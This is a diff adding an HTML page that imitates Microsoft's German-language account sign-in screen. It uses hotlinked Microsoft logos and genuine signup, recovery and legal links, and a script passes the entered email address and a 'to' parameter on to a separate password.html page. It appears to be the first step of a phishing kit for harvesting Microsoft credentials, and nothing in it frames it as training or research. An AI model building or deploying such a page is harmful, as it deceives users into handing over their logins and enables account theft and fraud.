@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bei Ihrem Konto anmelden</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="container">
+        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="logo">
+        <br>
+        <h1 id="title">Anmelden</h1>
+        <br>
+        <input type="email" id="input" placeholder="E-Mail, Telefon oder Skype" autocomplete="off">
+        <br>
+        <p>Kein Konto? <a href="https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d1031%26client_id%3d4765445b-32c6-49b0-83e6-1d93765276ca%26mkt%3dDE-DE%26opid%3dA258D831F8DCCC19%26opidt%3d1730839896%26uaid%3d86c7353345d64ea6a614fd22bfaa2436%26contextid%3d9341C332C75640ED%26opignore%3d1&mkt=DE-DE&uiflavor=web&lw=1&fl=easi2&client_id=4765445b-32c6-49b0-83e6-1d93765276ca&uaid=86c7353345d64ea6a614fd22bfaa2436&suc=4765445b-32c6-49b0-83e6-1d93765276ca&lic=1">Erstellen Sie jetzt eins!</a></p>
+        <p><a href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.microsoft365.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=638664348652605952.ZWM3OTE0MjMtODM1OC00ZTJhLWEyODQtMGIyMjg2NTM5MWIxMzM1Mzc1YTctZTJmNC00NzUwLWJkMmItNWZjZTZkNmEwZWYy&ui_locales=de&mkt=de&client-request-id=86c73533-45d6-4ea6-a614-fd22bfaa2436&state=kdE0oTwJ8S-NFTnubAeQZYfCX_51T8U7Zvp-yJPL3wPl1PBoQbcczp0nd7u7Qpd1-A8iPsT21kGkvSNXa6bgyFppf_StbO-Bu5HiX3KxptSsoAQ6mJMTUgX4gQo8dMKS57AV94Sg8OTHJsZOO70iwOh_YqEfYVPT7h6Nc9_CpuAD1yY6eKHw3--B_drgf67CchTZ3pPm68rYw71mrMZAWi12-N1bJ8Np5rv0XbeCjOA-oDvxTsTotR50v2dRaUNM4l6wc9yflUYQR1NhH1VnpHjr_czSKLnuYM54nIzPwwc&x-client-SKU=ID_NET8_0&x-client-ver=7.5.1.0">Sie können nicht auf Ihr Konto zugreifen?</a></p>
+        <button id="continue" onclick="goToPW()">Weiter</button>
+    </div>
+    <div id="options">
+        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" id="key-icon" alt="" width="33px">
+        <p id="options-p">Anmeldeoptionen</p>
+    </div>
+    <div id="bottom">
+        <a href="https://www.microsoft.com/de/servicesagreement/">Nutzungsbedingungen</a>
+        <a href="https://privacy.microsoft.com/de/privacystatement">Datenschutz und Cookies</a>
+        <a href="https://www.microsoft.com/" id="dots" style="font-weight: 900;">. . .</a>
+    </div>
+    <script>
+        function goToPW() {
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            const to = urlParams.get('to');
+            var email = document.getElementById("input").value;
+            document.location.href = `password.html?to=${to}&user=${email}`;
+        }
+    </script>
+</body>
+</html>
